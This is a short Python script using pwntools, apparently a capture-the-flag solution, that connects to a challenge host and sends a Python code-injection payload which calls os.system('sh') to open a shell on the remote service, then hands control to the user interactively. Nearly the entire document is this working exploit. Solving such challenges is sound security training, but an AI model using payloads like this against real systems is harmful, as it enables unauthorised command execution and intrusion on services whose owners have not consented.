from pwn import *

io = remote("chall1.lagncra.sh", 14583)

payload = "'runner.py' in sys.argv[0] or __import__('os').system('sh')"

io.sendlineafter(b"payload >", payload.encode())
io.interactive()